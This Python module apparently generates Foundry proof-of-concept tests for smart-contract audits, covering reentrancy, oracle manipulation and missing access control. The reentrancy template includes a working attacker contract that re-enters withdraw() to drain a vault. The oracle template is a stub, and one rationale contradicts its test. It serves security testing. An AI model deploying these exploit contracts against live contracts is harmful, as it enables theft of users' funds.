"""Foundry proof-of-concept template generator.

Generates Foundry test scaffolds (forge test) targeting specific
vulnerability patterns. The generator is purely string-based and
never shells out to ``forge``; if ``forge`` is not on PATH the
generator still produces usable files.
"""

from __future__ import annotations

import shutil
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


SCHEMA = "bugwolf-web3-foundry-poc/v1"


@dataclass(frozen=True)
class FoundryTemplate:
    """A generated Foundry PoC test."""

    name: str
    test_path: str
    test_source: str
    helper_source: str
    rationale: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            "schema": SCHEMA,
            "name": self.name,
            "test_path": self.test_path,
            "rationale": self.rationale,
            "forge_available": shutil.which("forge") is not None,
        }


@dataclass(frozen=True)
class FoundryPoCGenerator:
    """Generates Foundry PoC test files.

    Stub-safe: returns templates regardless of whether ``forge`` is
    installed.  Never raises.
    """

    def render_reentrancy(self, target: str = "Counter") -> FoundryTemplate:
        test_source = REENTRANCY_TEST_TEMPLATE.format(target=target)
        helper_source = REENTRANCY_HELPER
        return FoundryTemplate(
            name=f"reentrancy_{target}",
            test_path=f"test/{target.lower()}_reentrancy.t.sol",
            test_source=test_source,
            helper_source=helper_source,
            rationale=(
                "Single-function reentrancy PoC. Calls withdraw, then in the "
                "fallback drains before the balance updates. Expects the "
                "victim contract to revert on the second withdrawal."
            ),
        )

    def render_oracle_manipulation(
        self, target: str = "Vault", pair: str = "IUniswapV2Pair"
    ) -> FoundryTemplate:
        test_source = ORACLE_TEST_TEMPLATE.format(target=target, pair=pair)
        helper_source = ORACLE_HELPER
        return FoundryTemplate(
            name=f"oracle_{target}",
            test_path=f"test/{target.lower()}_oracle.t.sol",
            test_source=test_source,
            helper_source=helper_source,
            rationale=(
                "Sandwich-style oracle manipulation. Manipulates the spot "
                "reserve via a large swap, then calls the target's price-"
                "dependent action, then unwinds."
            ),
        )

    def render_access_control(self, target: str = "Vault") -> FoundryTemplate:
        test_source = ACCESS_TEST_TEMPLATE.format(target=target)
        helper_source = ACCESS_HELPER
        return FoundryTemplate(
            name=f"access_{target}",
            test_path=f"test/{target.lower()}_access.t.sol",
            test_source=test_source,
            helper_source=helper_source,
            rationale=(
                "Access-control bypass PoC. Calls the privileged function "
                "from a non-owner context and asserts the call succeeds, "
                "demonstrating the missing modifier."
            ),
        )


# ---- Templates ----------------------------------------------------------

REENTRANCY_TEST_TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/{target}.sol";
import "./helpers/ReentrancyHelper.sol";

contract Reentrancy_{target}Test is Test {{
    {target} public target;
    ReentrancyHelper public helper;

    function setUp() public {{
        target = new {target}();
        helper = new ReentrancyHelper(target);
        vm.deal(address(helper), 10 ether);
    }}

    function test_reentrancy_drains_vault() public {{
        target.deposit{{value: 5 ether}}();
        helper.attack{{value: 1 ether}}();
        // Expect helper balance > 5 ether after the drain.
        assertGt(address(helper).balance, 5 ether, "expected drain");
    }}
}}
"""

REENTRANCY_HELPER = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVaultLike {{
    function deposit() external payable;
    function withdraw() external;
}}

contract ReentrancyHelper {{
    IVaultLike public immutable target;
    constructor(IVaultLike _target) {{ target = _target; }}

    function attack() external payable {{
        target.deposit{{value: 1 ether}}();
        target.withdraw();
    }}

    receive() external payable {{
        if (address(target).balance >= 1 ether) {{
            target.withdraw();
        }}
    }}
}}
"""

ORACLE_TEST_TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/{target}.sol";
import "./helpers/OracleHelper.sol";

contract Oracle_{target}Test is Test {{
    {target} public target;
    OracleHelper public helper;

    function setUp() public {{
        target = new {target}();
        helper = new OracleHelper(target);
    }}

    function test_oracle_manipulation_profitable() public {{
        // 1. swap a huge amount to move the spot price
        helper.swapToIn({{pair: address(0xdead), amountIn: 100 ether}});
        // 2. perform the targeted action while price is skewed
        helper.targetedAction();
        // 3. unwind the swap to recover
        helper.unwind();
        assertGt(helper.profit(), 0, "expected profit");
    }}
}}
"""

ORACLE_HELPER = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUniswapV2Pair {{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}}

interface ITarget {{
    function someOracleDependentAction() external;
}}

contract OracleHelper {{
    ITarget public immutable target;
    constructor(ITarget _target) {{ target = _target; }}

    function swapToIn(address pair, uint amountIn) external payable {{
        // simplified — real PoC must compute reserves
    }}
    function targetedAction() external {{ target.someOracleDependentAction(); }}
    function unwind() external {{}}
    function profit() external pure returns (uint) {{ return 0; }}
}}
"""

ACCESS_TEST_TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/{target}.sol";

contract Access_{target}Test is Test {{
    function test_unauthorized_can_call_privileged() public {{
        {target} target = new {target}();
        // Caller is NOT owner — should revert if access control is sound.
        // If it succeeds, the modifier is missing.
        target.setOwner(address(0x1337));
        assertEq(target.owner(), address(0x1337));
    }}
}}
"""

ACCESS_HELPER = """// SPDX-License-Identifier: MIT
// helper file for access-control PoC
"""


__all__ = ["FoundryPoCGenerator", "FoundryTemplate", "SCHEMA"]